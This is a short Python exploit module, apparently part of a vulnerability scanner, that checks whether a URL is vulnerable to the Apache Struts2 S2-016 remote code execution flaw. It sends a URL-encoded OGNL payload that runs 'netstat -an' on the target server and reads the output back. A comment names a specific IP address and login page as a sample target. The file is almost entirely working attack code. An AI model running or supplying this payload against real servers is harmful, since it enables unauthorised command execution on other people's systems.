import requests
# url是随意
# http://218.75.55.165:8080/szxy/sys_login/login_login.do
class Exploit:
    def attack(self, url):
        print('test {} --> struts2_016'.format(url))
        exp = '''?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'netstat','-an'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D'''
        url += exp
        try:
            resp = requests.get(url, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-016"
        except:
            #print('test --> struts2_016 Failed!')
            return None
